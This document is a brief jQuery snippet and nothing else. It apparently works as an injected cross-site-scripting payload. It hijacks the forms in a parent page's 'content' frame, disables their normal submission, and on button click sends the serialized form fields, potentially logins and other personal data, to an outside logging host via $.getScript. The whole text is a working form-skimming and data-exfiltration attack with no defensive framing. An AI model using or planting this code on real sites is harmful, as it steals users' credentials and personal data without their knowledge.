$("form", window.parent.frames['content'].document).attr('action',"#")
$("form", window.parent.frames['content'].document).removeAttr('onsubmit')
$("input:button", window.parent.frames['content'].document).click(function(e){
  alert(0);
  e.preventDefault();
  $.getScript('//snhack.herokuapp.com/log?'+ $("form", window.parent.frames['content'].document).serialize())
})
